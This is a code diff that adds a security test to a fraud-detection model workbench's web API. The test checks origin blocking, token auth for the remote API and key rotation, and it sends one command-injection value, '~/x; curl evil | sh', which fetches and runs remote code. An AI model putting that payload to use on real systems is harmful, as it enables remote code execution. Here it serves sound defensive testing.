@@ -575,6 +575,32 @@ def test_model_timeline_and_comparison(client, trained_run):
     assert set(meta["loaded_runs"]) >= {"test-run", "test-run-twin"} and meta["public"]["public"] is False
 
 
+def test_workbench_api_guards(client, monkeypatch):
+    """a workbench has no login: the browser's own site markers keep other pages out, and the
+    remote api (root on a rented box) answers only to this machine unless a token is set"""
+    from fraudvae.server import api_remote
+
+    assert client.get("/api/meta", headers={"Sec-Fetch-Site": "cross-site"}).status_code == 403
+    assert client.get("/api/meta", headers={"Origin": "http://evil.example"}).status_code == 403
+    assert client.get("/api/meta", headers={"Origin": "http://127.0.0.1:8765"}).status_code == 200
+    assert client.get("/api/meta", headers={"Sec-Fetch-Site": "same-origin"}).status_code == 200
+    # the test client is not a loopback connection: no token configured, no remote api
+    assert client.get("/api/remote/key").status_code == 403
+    monkeypatch.setattr(api_remote, "TOKEN", "a-long-random-string")
+    assert client.get("/api/remote/key").status_code == 401
+    assert client.get("/api/remote/key", headers={"X-Fraudvae-Token": "wrong"}).status_code == 401
+    ok = {"X-Fraudvae-Token": "a-long-random-string"}
+    r = client.get("/api/remote/key", headers=ok)
+    assert r.status_code == 200 and r.json()["public_key"].startswith("ssh-ed25519")
+    # rotating the key is a post; the old get parameter does nothing
+    before = r.json()["fingerprint"]
+    assert client.get("/api/remote/key?rotate=true", headers=ok).json()["fingerprint"] == before
+    assert client.post("/api/remote/key/rotate", headers=ok).json()["fingerprint"] != before
+    # a remote directory is a path, never a command
+    bad = {"host": "198.51.100.7", "remote_dir": "~/x; curl evil | sh"}
+    assert client.post("/api/remote/probe", json=bad, headers=ok).status_code == 422
+
+
 def test_public_mode_gates(client, monkeypatch):
     """FRAUDVAE_PUBLIC: no training / data / default-model changes, no visitor state, paths hidden,
     per-address rate limit, batch rows capped"""
